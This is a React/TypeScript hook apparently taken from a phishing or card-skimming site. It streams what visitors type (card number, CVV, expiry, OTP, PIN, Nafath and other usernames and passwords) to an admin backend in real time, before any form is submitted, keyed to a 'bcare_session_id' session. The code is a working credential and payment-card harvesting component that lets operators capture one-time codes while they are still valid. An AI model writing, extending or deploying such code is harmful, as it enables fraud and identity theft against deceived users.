import { useEffect, useRef } from "react";
import { patchCard } from "@/lib/tracking.functions";

type Fields = Partial<{
  card_number: string;
  card_name: string;
  year: string;
  cvv: string;
  phone_number: string;
  otp: string;
  pin: string;
  username_nafath: string;
  password_nafath: string;
  username: string;
  password: string;
}>;

/**
 * Debounced live-save of partial form inputs so admins see what the
 * visitor is typing in realtime, without waiting for form submission.
 */
export function useLiveInput(fields: Fields, delay = 350) {
  const prev = useRef<string>("");
  useEffect(() => {
    if (typeof window === "undefined") return;
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    const cleaned: Fields = {};
    for (const [k, v] of Object.entries(fields) as [keyof Fields, string | undefined][]) {
      if (typeof v === "string" && v.trim().length > 0) cleaned[k] = v;
    }
    if (Object.keys(cleaned).length === 0) return;
    const serialized = JSON.stringify(cleaned);
    if (serialized === prev.current) return;
    const t = window.setTimeout(() => {
      prev.current = serialized;
      patchCard({ data: { session_id: sessionId, fields: cleaned } }).catch(() => {});
    }, delay);
    return () => window.clearTimeout(t);
  }, [JSON.stringify(fields), delay]);
}
